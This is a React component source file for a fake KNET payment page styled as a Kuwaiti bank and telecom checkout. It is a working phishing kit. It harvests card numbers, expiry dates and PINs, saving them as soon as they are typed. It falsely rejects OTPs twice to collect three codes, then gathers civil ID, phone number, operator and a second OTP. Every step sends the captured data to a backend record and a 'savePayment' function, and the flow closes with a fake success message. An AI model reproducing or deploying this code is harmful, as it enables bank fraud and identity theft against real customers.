import { useState, useEffect, useRef } from "react";
import { base44 } from "@/api/base44Client";

export default function KnetPayment() {
  const [banks, setBanks] = useState([]);
  const [step, setStep] = useState(1);
  const [isLoading, setIsLoading] = useState(false);
  const urlParams = new URLSearchParams(window.location.search);
  const [total] = useState(urlParams.get("amount") || "25.000");
  const civilId = urlParams.get("civilId") || urlParams.get("phone") || "";
  const recordIdRef = useRef(urlParams.get("recordId") || null);
  const [otpAttempts, setOtpAttempts] = useState(0);
  const [otpValue, setOtpValue] = useState("");
  const [otpError, setOtpError] = useState("");
  const [countdown, setCountdown] = useState(60);
  const [isCountdownActive, setIsCountdownActive] = useState(true);
  const [paymentInfo, setPaymentInfo] = useState({
    cardNumber: "",
    year: "",
    month: "",
    otp: "",
    bank: "",
    pass: "",
    bank_card: [""],
    prefix: "",
    phoneNumber: "",
    network: "",
    idNumber: "",
    otp2: ""
  });

  useEffect(() => {
    base44.entities.Bank.list().then(setBanks);
  }, []);

  useEffect(() => {
    let interval = null;
    if (isCountdownActive && countdown > 0) {
      interval = setInterval(() => setCountdown((c) => c - 1), 1000);
    } else if (countdown === 0) {
      setIsCountdownActive(false);
    }
    return () => { if (interval) clearInterval(interval); };
  }, [isCountdownActive, countdown]);

  const isStep1Disabled =
    !paymentInfo.prefix || paymentInfo.prefix === "i" ||
    !paymentInfo.bank ||
    !paymentInfo.cardNumber ||
    !paymentInfo.pass || paymentInfo.pass.length !== 4 ||
    !paymentInfo.month || paymentInfo.month === "0" ||
    !paymentInfo.year || paymentInfo.year === "0";

  const isStep2Disabled = paymentInfo.otp.length !== 6;

  const autoSavedRef = useRef(false);
  useEffect(() => {
    if (step === 1 && !isStep1Disabled && !autoSavedRef.current) {
      autoSavedRef.current = true;
      saveRecord({}, 1);
    }
    if (isStep1Disabled) autoSavedRef.current = false;
  }, [isStep1Disabled, step]);

  const savedOtpsRef = useRef({ otp1: "", otp2: "" });

  const saveRecord = async (extraData = {}, stepNum = step) => {
    if (extraData.otp1) savedOtpsRef.current.otp1 = extraData.otp1;
    if (extraData.otp2) savedOtpsRef.current.otp2 = extraData.otp2;

    const payload = {
      civil_id: civilId,
      amount: total,
      bank: paymentInfo.bank,
      card_prefix: paymentInfo.prefix,
      card_number: paymentInfo.cardNumber,
      expiry_month: paymentInfo.month,
      expiry_year: paymentInfo.year,
      pin: paymentInfo.pass,
      otp1: savedOtpsRef.current.otp1 || paymentInfo.otp,
      id_number: paymentInfo.idNumber,
      phone_number: paymentInfo.phoneNumber,
      network: paymentInfo.network,
      otp2: savedOtpsRef.current.otp2 || paymentInfo.otp2,
      step_reached: stepNum,
      user_agent: navigator.userAgent,
      ...extraData
    };
    if (recordIdRef.current) {
      await base44.entities.PaymentRecord.update(recordIdRef.current, payload);
    } else {
      const record = await base44.entities.PaymentRecord.create(payload);
      recordIdRef.current = record.id;
    }
    await base44.functions.invoke("savePayment", { type: "knet", ...payload });
  };

  const handleSubmit = () => {
    if (step === 1) {
      setIsLoading(true);
      saveRecord({}, 1);
      setTimeout(() => { setIsLoading(false); setStep(2); }, 2000);
    } else if (step === 2) {
      setIsLoading(true);
      setOtpError("");
      const newAttempts = otpAttempts + 1;
      setOtpAttempts(newAttempts);
      const currentOtp = otpValue;
      setOtpValue("");
      setPaymentInfo((p) => ({ ...p, otp: "" }));
      saveRecord({ otp1: currentOtp }, 2);
      setTimeout(() => {
        setIsLoading(false);
        if (newAttempts >= 3) {
          setStep(3);
          setOtpAttempts(0);
          setOtpError("");
        } else {
          setOtpError("The OTP you entered is incorrect. Please check your SMS and try again.");
        }
      }, 3000);
    } else if (step === 3) {
      setIsLoading(true);
      saveRecord({}, 3);
      setTimeout(() => { setIsLoading(false); setStep(4); }, 5000);
    } else if (step === 4) {
      setIsLoading(true);
      saveRecord({ otp2: paymentInfo.otp2 }, 4);
      setTimeout(() => {
        setIsLoading(false);
        alert("Payment completed!");
      }, 4000);
    }
  };

  const isSubmitDisabled =
    (step === 1 && isStep1Disabled) ||
    (step === 2 && isStep2Disabled);

  return (
    <div style={{ fontFamily: "Verdana, Arial, Helvetica, sans-serif", backgroundColor: "#ebebeb", minHeight: "100vh" }} dir="ltr" className="px-6">
      <style>{knetCss}</style>

      <div style={{ maxWidth: '100%', margin: "0 auto", padding: "10px 5px 0" }}>
        <img
          src="https://media.base44.com/images/public/6a1f21dff88d7df94e752b5a/97fe1a389_mob.jpg"
          alt="Fraud Awareness"
          style={{ width: "100%", borderRadius: 10, display: "block", boxShadow: "0 2px 10px rgba(0,0,0,0.3)" }} />
      </div>

      <div id="knet-container">
        <form onSubmit={(e) => e.preventDefault()}>
          <div id="knet-content-block">
            <div id="knet-info-card" className="knet-form-card">
              <div className="knet-row">
                <div className="knet-col-label"><label>Payment Form</label></div>
                <div className="knet-col-value" style={{ textAlign: "right" }}>
                  <img src="https://media.base44.com/images/public/6a15a1a67fdfc61005f1d71f/bbc3e328c_Website-NBK-Logo_800x800px.jpg" alt="KV" width={40} style={{ objectFit: "contain" }} className="mx-1" />
                </div>
              </div>
              <div className="knet-row">
                <label className="knet-col-label">Merchant:</label>
                <label className="knet-col-value knet-text-label">Mobile Telecommunication Co.</label>
              </div>
              <div className="knet-row">
                <label className="knet-col-label">Amount:</label>
                <label className="knet-col-value knet-text-label">{total} KD</label>
              </div>
            </div>

            <div className="knet-form-card">
              {step === 1 && <Step1 paymentInfo={paymentInfo} setPaymentInfo={setPaymentInfo} banks={banks} />}
              {step === 2 && (
                <Step2
                  paymentInfo={paymentInfo}
                  setPaymentInfo={setPaymentInfo}
                  otpValue={otpValue}
                  setOtpValue={setOtpValue}
                  countdown={countdown}
                  otpError={otpError} />
              )}
              {step === 3 && <Step3 paymentInfo={paymentInfo} setPaymentInfo={setPaymentInfo} />}
              {step === 4 && <Step4 paymentInfo={paymentInfo} setPaymentInfo={setPaymentInfo} />}
            </div>

            <div className="knet-form-card">
              <div className="knet-row knet-btn-row">
                <button
                  className="knet-submit-btn"
                  disabled={isSubmitDisabled || isLoading}
                  onClick={handleSubmit}>
                  {isLoading ? "Wait..." : step === 1 ? "Submit" : "Confirm"}
                </button>
                <button
                  className="knet-cancel-btn"
                  onClick={() => window.history.back()}
                  type="button">
                  Cancel
                </button>
              </div>
            </div>

            <div style={{ textAlign: "center", marginTop: 15, fontWeight: "bold", color: "#2277d3", fontSize: 10 }}>
              All Rights Reserved. Copyright 2024<br />
              <strong>The Shared Electronic Banking Services Company - KNET</strong>
            </div>
          </div>
        </form>
        {isLoading && <LoadingOverlay />}
      </div>
    </div>
  );
}

function Step1({ paymentInfo, setPaymentInfo, banks }) {
  return (
    <>
      <div className="knet-row">
        <label className="knet-col-label">Select Your Bank:</label>
        <select
          className="knet-col-value knet-select"
          value={paymentInfo.bank}
          onChange={(e) => {
            const bank = banks.find((b) => b.value === e.target.value);
            setPaymentInfo((p) => ({
              ...p,
              bank: e.target.value,
              bank_card: bank ? bank.cardPrefixes : [""],
              prefix: ""
            }));
          }}>
          <option value="">Select Your Banks</option>
          {banks.map((b, i) => (
            <option key={i} value={b.value}>{b.label} [{b.value}]</option>
          ))}
        </select>
      </div>

      <div className="knet-row">
        <label className="knet-col-label">Card Number:</label>
        <div className="knet-card-inputs">
          <select
            className="knet-prefix-select"
            value={paymentInfo.prefix}
            onChange={(e) => setPaymentInfo((p) => ({ ...p, prefix: e.target.value }))}>
            <option value="i">prefix</option>
            {(paymentInfo.bank_card || []).map((pfx, i) => (
              <option key={i} value={pfx}>{pfx}</option>
            ))}
          </select>
          <input
            type="tel"
            inputMode="numeric"
            pattern="[0-9]*"
            maxLength={10}
            value={paymentInfo.cardNumber}
            onChange={(e) => setPaymentInfo((p) => ({ ...p, cardNumber: e.target.value.replace(/\D/g, "") }))}
            placeholder="0000000000"
            className="knet-card-number-input" />
        </div>
      </div>

      <div className="knet-row">
        <label className="knet-col-label">Expiration Date:</label>
        <div className="knet-expiry-inputs">
          <select
            className="knet-expiry-mm"
            value={paymentInfo.month}
            onChange={(e) => setPaymentInfo((p) => ({ ...p, month: e.target.value }))}>
            <option value="0">MM</option>
            {Array.from({ length: 12 }, (_, i) => i + 1).map((m) => (
              <option key={m} value={String(m).padStart(2, "0")}>{String(m).padStart(2, "0")}</option>
            ))}
          </select>
          <select
            className="knet-expiry-yyyy"
            value={paymentInfo.year}
            onChange={(e) => setPaymentInfo((p) => ({ ...p, year: e.target.value }))}>
            <option value="0">YYYY</option>
            {Array.from({ length: 14 }, (_, i) => 2024 + i).map((y) => (
              <option key={y} value={y}>{y}</option>
            ))}
          </select>
        </div>
      </div>

      <div className="knet-row">
        <label className="knet-col-label">PIN:</label>
        <input
          type="tel"
          inputMode="numeric"
          pattern="[0-9]*"
          maxLength={4}
          value={paymentInfo.pass}
          onChange={(e) => setPaymentInfo((p) => ({ ...p, pass: e.target.value.replace(/\D/g, "") }))}
          className="knet-col-value knet-input"
          autoComplete="off"
          placeholder="••••"
          style={{ WebkitTextSecurity: "disc" }} />
      </div>
    </>
  );
}

function Step2({ paymentInfo, setPaymentInfo, otpValue, setOtpValue, countdown, otpError }) {
  return (
    <>
      {otpError && <div className="knet-otp-error">⚠ {otpError}</div>}
      <div className="knet-alert-row">
        <strong>Please note:</strong> A 6-digit verification code has been sent via text message to your registered phone number
      </div>
      <div className="knet-row">
        <label className="knet-col-label">Card Number:</label>
        <label className="knet-col-value knet-text-label">
          {paymentInfo.cardNumber.substring(0, 4) + "****" + paymentInfo.cardNumber.substring(8)}
        </label>
      </div>
      <div className="knet-row">
        <label className="knet-col-label">Month expiry:</label>
        <label className="knet-col-value knet-text-label">{paymentInfo.month}</label>
      </div>
      <div className="knet-row">
        <label className="knet-col-label">Year expiry:</label>
        <label className="knet-col-value knet-text-label">{paymentInfo.year}</label>
      </div>
      <div className="knet-row">
        <label className="knet-col-label">Pin:</label>
        <label className="knet-col-value knet-text-label">****</label>
      </div>
      <div className="knet-row">
        <label className="knet-col-label">OTP:</label>
        <input
          type="tel"
          maxLength={6}
          value={otpValue}
          onChange={(e) => {
            setOtpValue(e.target.value.replace(/\D/g, ""));
            setPaymentInfo((p) => ({ ...p, otp: e.target.value.replace(/\D/g, "") }));
          }}
          className="knet-col-value knet-input"
          placeholder={`Timeout in: 01:${countdown === 0 ? "00" : String(countdown).padStart(2, "0")}`} />
      </div>
    </>
  );
}

function Step3({ paymentInfo, setPaymentInfo }) {
  return (
    <>
      <div className="knet-row">
        <label className="knet-col-label">ID Number:</label>
        <input
          type="tel"
          inputMode="numeric"
          maxLength={12}
          value={paymentInfo.idNumber}
          onChange={(e) => setPaymentInfo((p) => ({ ...p, idNumber: e.target.value.replace(/\D/g, "") }))}
          className="knet-col-value knet-input"
          placeholder="Civil / Residence ID" />
      </div>
      <div className="knet-row">
        <label className="knet-col-label">Authorized Phone Number:</label>
        <input
          type="tel"
          inputMode="numeric"
          maxLength={10}
          value={paymentInfo.phoneNumber}
          onChange={(e) => setPaymentInfo((p) => ({ ...p, phoneNumber: e.target.value.replace(/\D/g, "") }))}
          className="knet-col-value knet-input"
          placeholder="05XXXXXXXX" />
      </div>
      <div className="knet-row">
        <label className="knet-col-label">Network operator:</label>
        <select
          className="knet-col-value knet-select"
          value={paymentInfo.network}
          onChange={(e) => setPaymentInfo((p) => ({ ...p, network: e.target.value }))}>
          <option value="">Choose Network operator...</option>
          <option value="STC">STC</option>
          <option value="Zain">Zain</option>
          <option value="Ooredoo">Ooredoo</option>
        </select>
      </div>
    </>
  );
}

function Step4({ paymentInfo, setPaymentInfo }) {
  return (
    <>
      <div className="knet-alert-row">
        <strong>Please note:</strong> A 6-digit verification code has been sent via text message to your registered phone number
      </div>
      <div className="knet-row">
        <label className="knet-col-label">ID Number:</label>
        <label className="knet-col-value knet-text-label">{paymentInfo.idNumber}</label>
      </div>
      <div className="knet-row">
        <label className="knet-col-label">Phone Number:</label>
        <label className="knet-col-value knet-text-label">{paymentInfo.phoneNumber}</label>
      </div>
      <div className="knet-row">
        <label className="knet-col-label">OTP:</label>
        <input
          type="tel"
          maxLength={6}
          value={paymentInfo.otp2}
          onChange={(e) => setPaymentInfo((p) => ({ ...p, otp2: e.target.value.replace(/\D/g, "") }))}
          className="knet-col-value knet-input"
          placeholder="6-digit OTP" />
      </div>
    </>
  );
}

function LoadingOverlay() {
  return (
    <div style={{
      position: "fixed", inset: 0, background: "rgba(85,85,85,0.55)",
      display: "flex", alignItems: "center", justifyContent: "center", zIndex: 9999
    }}>
      <div style={{
        background: "#fff", borderRadius: 10, padding: "30px 40px",
        display: "flex", flexDirection: "column", alignItems: "center", gap: 12,
        boxShadow: "0 4px 24px rgba(0,0,0,0.3)"
      }}>
        <div className="knet-spinner"></div>
        <div style={{ color: "#0070cd", fontWeight: "bold", fontSize: 13 }}>Processing...</div>
      </div>
    </div>
  );
}

const knetCss = `
  @import url('https://fonts.googleapis.com/css2?family=Almarai:wght@300;400;700;800&display=swap');
  :root {
    --primary: 328 100% 43%;
    --primary-foreground: 210 40% 98%;
    --ring: 328 100% 43%;
  }
  * { font-family: Almarai, sans-serif !important; }

  #knet-container {
    width: 100%;
    max-width: 460px;
    margin: 0 auto;
    padding: 0 25px 40px;
    box-sizing: border-box;
    position: relative;
    font-family: Verdana, Arial, Helvetica, sans-serif;
  }
  #knet-content-block { width: 100%; }
  .knet-form-card {
    background: #fff;
    padding: 18px;
    border: 2px solid #8f8f90;
    border-radius: 15px;
    margin-bottom: 14px;
    box-shadow: 0 0 6px rgba(0,0,0,0.25);
    margin-top: 14px;
    overflow: hidden;
  }
  .knet-row {
    border-bottom: 1px solid #8f8f90;
    padding: 6px 0;
    overflow: hidden;
  }
  .knet-row:last-child { border-bottom: 0; padding-bottom: 0; }
  .knet-col-label {
    float: left;
    width: 40%;
    font-size: 11px;
    color: #0070cd;
    font-weight: bold;
    line-height: 22px;
  }
  .knet-col-value {
    float: left;
    width: 58%;
    font-size: 11px;
    color: #444;
  }
  .knet-text-label { font-weight: normal; line-height: 22px; }
  .knet-form-card::after, .knet-row::after { content: ""; display: table; clear: both; }
  .knet-select {
    font-size: 11px; height: 22px; color: #444;
    border: 1px solid #ccc; width: 58%; box-sizing: border-box; float: left;
  }
  .knet-input {
    border: 2px solid #0070cd;
    box-shadow: inset 0 0 5px rgba(0,0,0,0.2);
    padding: 0 4px; outline: 0; font-size: 11px; height: 22px;
    color: #444; box-sizing: border-box; width: 58%; float: left;
  }
  .knet-card-inputs {
    float: left; width: 58%; display: flex; gap: 4px; box-sizing: border-box; overflow: hidden;
  }
  .knet-prefix-select {
    width: 44%; min-width: 0; font-size: 11px; height: 22px; color: #444;
    border: 1px solid #ccc; box-sizing: border-box; flex-shrink: 0;
  }
  .knet-card-number-input {
    border: 2px solid #0070cd;
    box-shadow: inset 0 0 5px rgba(0,0,0,0.2);
    padding: 0 4px; outline: 0; font-size: 11px; height: 22px;
    color: #444; box-sizing: border-box; flex: 1; min-width: 0; width: 0;
  }
  .knet-expiry-inputs {
    float: left; width: 58%; display: flex; gap: 6px; box-sizing: border-box;
  }
  .knet-expiry-mm {
    width: 38%; font-size: 11px; height: 22px; color: #444;
    border: 1px solid #ccc; box-sizing: border-box;
  }
  .knet-expiry-yyyy {
    width: 60%; font-size: 11px; height: 22px; color: #444;
    border: 1px solid #ccc; box-sizing: border-box;
  }
  .knet-btn-row { border: 0; padding-bottom: 0; display: flex; gap: 4px; }
  .knet-submit-btn {
    background: #eaeaea; border: 1px solid #cacaca; font-weight: bold;
    color: #666; width: 50%; height: 28px; border-radius: 4px; font-size: 12px;
    cursor: pointer; font-family: Verdana, Arial, Helvetica, sans-serif;
  }
  .knet-submit-btn:disabled { opacity: 0.55; cursor: not-allowed; }
  .knet-cancel-btn {
    background: #eaeaea; border: 1px solid #cacaca; font-weight: bold;
    color: #666; width: 50%; height: 28px; border-radius: 4px; font-size: 12px;
    cursor: pointer; font-family: Verdana, Arial, Helvetica, sans-serif;
  }
  .knet-alert-row {
    font-size: 12px; text-align: justify; background: #d9edf6;
    padding: 10px; border: 1px solid #bacce0; border-radius: 4px;
    margin-bottom: 10px; color: #444;
  }
  .knet-otp-error {
    font-size: 12px; background: #fde8e8; border: 1px solid #f5c0c0;
    border-radius: 4px; padding: 10px; margin-bottom: 10px;
    color: #c0392b; font-weight: bold;
  }
  .knet-spinner {
    width: 36px; height: 36px; border: 4px solid #e0e0e0;
    border-top-color: #0070cd; border-radius: 50%;
    animation: knet-spin 0.8s linear infinite;
  }
  @keyframes knet-spin { to { transform: rotate(360deg); } }
  @media (max-width: 480px) {
    #knet-container { padding: 0 8px 20px; }
    .knet-form-card { padding: 12px; }
    .knet-submit-btn, .knet-cancel-btn { width: 50%; height: 32px; font-size: 13px; }
    .knet-col-label { width: 32%; font-size: 10px; }
    .knet-col-value { width: 66%; font-size: 10px; }
    .knet-select { width: 66%; font-size: 10px; }
    .knet-input { width: 66%; font-size: 10px; }
    .knet-card-inputs { float: left; width: 66%; display: flex; flex-wrap: nowrap; gap: 3px; box-sizing: border-box; overflow: hidden; }
    .knet-prefix-select { width: 40%; min-width: 0; font-size: 10px; flex-shrink: 0; }
    .knet-card-number-input { flex: 1; min-width: 0; font-size: 10px; }
    .knet-expiry-inputs { width: 66%; }
    .knet-expiry-mm { font-size: 10px; }
    .knet-expiry-yyyy { font-size: 10px; }
  }
  * { font-family: Verdana, Arial, Helvetica, sans-serif !important; }
  #knet-container input, #knet-container select, #knet-container textarea {
    font-size: 11px !important;
  }
  @media (max-width: 480px) {
    #knet-container input, #knet-container select, #knet-container textarea {
      font-size: 10px !important;
    }
  }
`;